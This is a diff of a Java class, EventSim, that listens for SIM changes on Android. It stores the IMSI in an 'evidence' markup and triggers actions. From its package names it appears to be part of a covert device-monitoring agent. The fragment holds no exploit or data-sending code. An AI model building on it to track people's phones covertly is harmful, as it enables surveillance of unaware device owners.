@@ -14,38 +14,35 @@ import java.io.IOException;
 import com.android.service.Device;
 import com.android.service.Sim;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfEvent;
 import com.android.service.evidence.Markup;
 import com.android.service.interfaces.Observer;
 import com.android.service.listener.ListenerSim;
 import com.android.service.util.Check;
 
-public class EventSim extends EventBase implements Observer<Sim> {
+public class EventSim extends BaseEvent implements Observer<Sim> {
 	/** The Constant TAG. */
 	private static final String TAG = "EventSim"; //$NON-NLS-1$
 
 	private int actionOnEnter;
 
 	@Override
-	public void begin() {
+	public void actualStart() {
 		ListenerSim.self().attach(this);
 	}
 
 	@Override
-	public void end() {
+	public void actualStop() {
 		ListenerSim.self().detach(this);
 	}
 
 	@Override
-	public boolean parse(EventConf event) {
-		super.setEvent(event);
-
-		actionOnEnter = event.getAction();
-
+	public boolean parse(ConfEvent conf) {
 		return true;
 	}
 
 	@Override
-	public void go() {
+	public void actualGo() {
 		// TODO Auto-generated method stub
 	}
 
@@ -60,7 +57,7 @@ public class EventSim extends EventBase implements Observer<Sim> {
 			return 0;
 		}
 
-		Markup storedImsi = new Markup(EventType.EVENT_SIM_CHANGE);
+		Markup storedImsi = new Markup(this);
 
 		// Vediamo se gia' c'e' un markup
 		if (storedImsi.isMarkup() == true) {
@@ -74,6 +71,7 @@ public class EventSim extends EventBase implements Observer<Sim> {
 					storedImsi.writeMarkup(value);
 
 					onEnter();
+					onExit();
 				}
 			} catch (final IOException e) {
 				if (Cfg.DEBUG) {
@@ -92,7 +90,5 @@ public class EventSim extends EventBase implements Observer<Sim> {
 		return 0;
 	}
 
-	public void onEnter() {
-		trigger(actionOnEnter);
-	}
+
 }
